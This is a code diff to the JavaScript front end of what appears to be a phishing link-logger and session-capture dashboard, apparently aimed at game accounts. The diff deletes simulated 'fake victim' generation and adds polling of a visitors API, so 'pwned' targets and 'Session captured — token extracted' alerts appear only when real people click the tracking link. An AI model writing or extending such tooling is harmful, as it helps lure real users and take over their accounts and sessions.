@@ -350,27 +350,27 @@ window.AC = window.AC || {};
     };
     state.activeLinks.unshift(linkEntry);
 
-    // After 2-5 min, simulate victim clicking — THEN generate token and record victim
-    setTimeout(function () {
-      linkEntry.status = 'captured';
-      linkEntry.clicks = Math.floor(Math.random() * 3) + 1;
-      linkEntry.token = generateToken();
-
-      if (window.AC.gen) {
-        var v = window.AC.gen.fakeVictim();
-        v.status = 'pwned';
-        var targetInput = document.getElementById('target-input');
-        if (targetInput && targetInput.value) {
-          v.username = targetInput.value;
-        }
-        v.so2Id = Math.floor(Math.random() * 80000000 + 10000000);
-        state.victims.unshift(v);
-      }
-
-      if (window.AC.notify) {
-        window.AC.notify.show('Session captured — token extracted. Check Links & Intercept tabs.', 'info');
-      }
-    }, Math.random() * 180000 + 120000);
+    // Victims will ONLY appear when someone clicks the link in real life!
+    // Periodic check for new real visitors
+    if (state.currentLoggerId) {
+      var checkInterval = setInterval(function() {
+        fetch('/api/visitors/' + state.currentLoggerId)
+          .then(function(r) { return r.json(); })
+          .then(function(data) {
+            if (data.visitors && data.visitors.length > 0) {
+              linkEntry.status = 'captured';
+              linkEntry.clicks = data.visitors.length;
+              if (!linkEntry.token) linkEntry.token = generateToken();
+              if (window.AC.notify) {
+                window.AC.notify.show('Session captured! Target opened link. Check Intercept logs.', 'info');
+              }
+              clearInterval(checkInterval);
+            }
+          })
+          .catch(function() {});
+      }, 5000);
+      state.cancelFunctions.push(function() { clearInterval(checkInterval); });
+    }
 
     // Copy button
     var copyBtn = document.getElementById('btn-copy-link');
@@ -632,10 +632,8 @@ window.AC = window.AC || {};
     initActivation();
     initDashboard();
 
-    // Generate initial victims
-    if (window.AC.gen) {
-      state.victims = window.AC.gen.fakeVictimsList(5);
-    }
+    // Victims list starts completely empty until real link is clicked
+    state.victims = [];
 
     // Version display
     var versionEls = document.querySelectorAll('.version-tag');
